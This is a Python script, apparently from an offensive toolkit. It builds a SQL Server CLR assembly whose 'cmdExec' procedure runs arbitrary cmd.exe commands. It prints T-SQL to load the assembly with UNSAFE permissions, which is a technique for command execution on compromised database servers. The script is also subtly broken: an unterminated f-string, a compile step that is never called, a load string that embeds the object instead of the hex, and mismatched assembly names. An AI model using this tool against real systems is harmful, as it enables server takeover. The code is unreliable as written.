#!/bin/env python3
import ak
import binascii

FN_BASE = "win_sqlassembly"

class SQLAssembly:
    def __init__(self, base_filename):
        self.source_filename = base_filename + '.cs'
        self.compiled_filename = base_filename + '.dll'

        self. template = r"""
        using System;
        using Microsoft.SqlServer.Server;
        using System.Data.SqlTypes;
        using System.Diagnostics;

        public class StoredProcedures
        {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void cmdExec (SqlString execCommand) {
                Process proc = new Process();
                proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
                proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.Start();
                SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
                SqlContext.Pipe.SendResultsStart(record);
                record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
                SqlContext.Pipe.SendResultsRow(record); SqlContext.Pipe.SendResultsEnd();
                proc.WaitForExit();
                proc.Close(); }
        };
        """

    def compile(self):
        ak.write_file(self.source_filename, self.template)
        ak.cs_compile(self.source_filename, f"/target:library /r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll -o {self.compiled_filename})

    def get_hex(self):
        with open(self.compiled_filename, 'rb') as f:
            content = f.read()
        return binascii.hexlify(content)


def main():
    # Convert to hex
    s = SQLAssembly(FN_BASE)

    print(s.get_hex())

    print(f"Load with: CREATE ASSEMBLY my_assembly FROM 0x{s}..... WITH PERMISSION_SET = UNSAFE;")
    print("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];")

if __name__ == "__main__":
    main()

